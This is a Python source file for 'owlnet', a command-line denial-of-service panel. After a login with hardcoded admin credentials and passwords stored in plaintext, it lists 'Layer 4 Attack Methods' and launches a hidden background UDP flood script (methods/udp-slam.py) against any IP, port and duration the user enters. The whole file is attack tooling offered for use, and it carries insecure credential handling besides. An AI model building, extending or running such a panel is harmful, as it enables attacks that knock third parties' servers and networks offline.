from colorama import Fore, init
import os
import subprocess
import json
import getpass
import time
init()

def load_users(filename):
    try:
        with open(filename, 'r') as file:
            data = json.load(file)
        return data
    except FileNotFoundError:
        return {}

def save_users(filename, data):
    with open(filename, 'w') as file:
        json.dump(data, file, indent=4)

def hide(command):
    subprocess.Popen(["nohup"] + command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

os.system('title ' + 'owlnet')

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

user_termux = Fore.LIGHTCYAN_EX
at_termux = Fore.LIGHTWHITE_EX + '@'
boatnet_termux = Fore.LIGHTCYAN_EX + 'owlnet'
left_bracket = Fore.LIGHTCYAN_EX + '['
right_bracket = Fore.LIGHTCYAN_EX + ']'

commands = '''
                                   Commands:
                       ═════════╦════════════════╦══════════
               ╔════════════════╩════════════════╩═══════════════╗
    ╔══════════╩══════════╦══╦═════════════════════╦══╦══════════╩══════════╗
    ║  layer4             ║..║  ports              ║..║  clear              ║
    ║  layer7             ║..║  rules              ║..║  <empty>            ║
    ║  tools              ║..║  cls                ║..║  <empty>            ║
    ╚═════════════════════╩══╩═════════════════════╩══╩═════════════════════╝
    '''

layer4 = '''
                            Layer 4 Attack Methods:
                       ═════════╦════════════════╦══════════
               ╔════════════════╩════════════════╩═══════════════╗
    ╔══════════╩══════════╦══╦═════════════════════╦══╦══════════╩══════════╗
    ║  udp                ║..║  <empty>            ║..║  <empty>            ║
    ║  <empty>            ║..║  <empty>            ║..║  <empty>            ║
    ║  <empty>            ║..║  <empty>            ║..║  <empty>            ║
    ╚═════════════════════╩══╩═════════════════════╩══╩═════════════════════╝
                        (Note: type ?<method> for usage)
    '''

def login(users):
    username = input("owlnet@username ~ ")
    password = getpass.getpass("owlnet@password ~ ")

    if username == "admin" and password == "admin1632":
        print("Admin login successful.")
        add_account(users)
    elif username in users and users[username] == password:
        print("Login successful.")
        time.sleep(1)
        clear()
        return username
    else:
        print("Login failed.")
        exit()

def add_account(users):
    new_username = input("owlnet@username ~ ")
    new_password = getpass.getpass("owlnet@password ~ ")
    users[new_username] = new_password
    save_users("users.json", users)
    print("Account added successfully.")

def loading_animation():
    animation = ["/", "-", "\\", "|"]
    for _ in range(10):
        for char in animation:
            print(Fore.LIGHTCYAN_EX + " Loading " + char, end="\r")
            time.sleep(0.1)

clear()

users = load_users("users.json")
if not users:
    admin_username = "faint"
    admin_password = "admin1632"
    users[admin_username] = admin_password
    save_users("users.json", users)
    print("Admin account created. Please restart the program.")
else:
    loading_animation()  # Show a loading animation
    logged_in_username = login(users)
    while True:
        banner = left_bracket + user_termux + logged_in_username + at_termux + boatnet_termux + right_bracket
        main = input(banner + ' ')

        if main == 'help':
            clear()
            print(commands)
        elif main == 'clear' or main == 'cls':
            clear()
        elif main == 'layer4':
            clear()
            print(layer4)
        elif main == '?udp':
            clear()
            print('udp <ip> <port> <time>\n')
        elif "udp" in main:
            parts = main.split()
            udp_ip = parts[1]
            udp_port = parts[2]
            udp_time = parts[3]

            command_to_run = f'python methods/udp-slam.py {{}} {{}} {{}}'.format(udp_ip, udp_port, udp_time)
            hide(command_to_run)
            print(f'Sent attack to {{}} on port {{}} for {{}} seconds.'.format(udp_ip, udp_port, udp_time))
        else:
            print()
